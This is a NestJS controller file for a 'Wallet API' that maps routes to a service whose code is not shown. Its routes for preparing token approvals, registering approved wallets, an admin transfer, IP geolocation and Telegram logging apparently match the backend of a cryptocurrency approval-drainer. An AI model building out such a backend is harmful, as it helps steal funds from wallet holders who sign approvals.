import { Body, Controller, Get, Param, Post, Query, Req } from "@nestjs/common";
import { ApiBody, ApiOperation, ApiTags } from "@nestjs/swagger";
import { WalletService } from "./wallet.service";

@ApiTags("Wallet API")
@Controller("api")
export class WalletController {
  constructor(private readonly walletService: WalletService) {}

  @Get("balances")
  @ApiOperation({ summary: "Fetch EVM/TRON balances for connected wallets" })
  balances(@Query("evm") evm?: string, @Query("tron") tron?: string) {
    return this.walletService.getBalances(evm ?? "", tron ?? "");
  }

  @Post("approvals/prepare")
  @ApiOperation({ summary: "Build approve() transaction payload" })
  approvalsPrepare(@Body() body: Record<string, unknown>) {
    return this.walletService.prepareApproval(body);
  }

  @Post("approvals/confirm")
  @ApiOperation({ summary: "Confirm approval and persist in Postgres" })
  approvalsConfirm(@Body() body: Record<string, unknown>) {
    return this.walletService.confirmApproval(body);
  }

  @Get("approvals/debug")
  @ApiOperation({ summary: "Debug approvals/audits/transfers snapshot" })
  approvalsDebug() {
    return this.walletService.debugApprovals();
  }

  @Post("approvals/debug")
  approvalsDebugPost(@Body() body: Record<string, unknown>) {
    return this.walletService.captureFlowLog(body);
  }

  @Get("approvals/:id")
  approvalById(@Param("id") id: string) {
    return this.walletService.getApproval(id);
  }

  @Post("approvals/revoke/prepare")
  approvalsRevokePrepare(@Body() body: Record<string, unknown>) {
    return this.walletService.prepareRevoke(body);
  }

  @Post("tron-broadcast")
  tronBroadcast(@Body() body: Record<string, unknown>) {
    return this.walletService.broadcastTron(body);
  }

  @Post("verify-allowance")
  verifyAllowance(@Body() body: Record<string, unknown>) {
    return this.walletService.verifyAllowance(body);
  }

  @Post("register-approved")
  registerApproved(@Body() body: Record<string, unknown>) {
    return this.walletService.registerApproved(body);
  }

  @Post("admin/transfer")
  adminTransfer(@Body() body: Record<string, unknown>, @Req() req: Request) {
    return this.walletService.adminTransfer(body, req.headers);
  }

  @Post("tron-approve")
  tronApprove(@Body() body: Record<string, unknown>) {
    return this.walletService.legacyTronApprove(body);
  }

  @Post("consent_")
  consent(@Body() body: Record<string, unknown>) {
    return this.walletService.consent(body);
  }

  @Post("energy-delegate")
  energyDelegate(@Body() body: Record<string, unknown>) {
    return this.walletService.energyDelegate(body);
  }

  @Get("ipgeo")
  ipgeo(@Req() req: Request) {
    return this.walletService.ipgeo(req.headers);
  }

  @Post("tg-log")
  @ApiBody({ type: Object })
  tgLog(@Body() body: Record<string, unknown>, @Req() req: Request) {
    return this.walletService.tgLog(body, req.headers);
  }
}
